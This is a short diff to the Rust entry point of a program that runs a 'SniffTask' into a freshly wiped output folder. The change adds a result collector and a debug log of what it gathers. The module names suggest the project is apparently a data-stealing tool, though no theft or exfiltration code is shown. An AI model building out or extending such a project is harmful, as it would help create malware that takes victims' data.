@@ -15,9 +15,12 @@
 
 extern crate alloc;
 
+use collector::atomic::AtomicCollector;
+use collector::DisplayCollector;
 use ipinfo::init_ip_info;
 use shadowsniff::SniffTask;
 use tasks::Task;
+use utils::log_debug;
 use utils::path::Path;
 
 mod panic;
@@ -36,9 +39,13 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     let _ = out.remove_dir_all();
     let _ = out.mkdir();
     
+    let collector = AtomicCollector::default();
+    
     unsafe {
-        SniffTask::new().run(&out);
+        SniffTask::new().run(&out, &collector);
     }
+    
+    log_debug!("{}", DisplayCollector(collector));
 
     0
 }
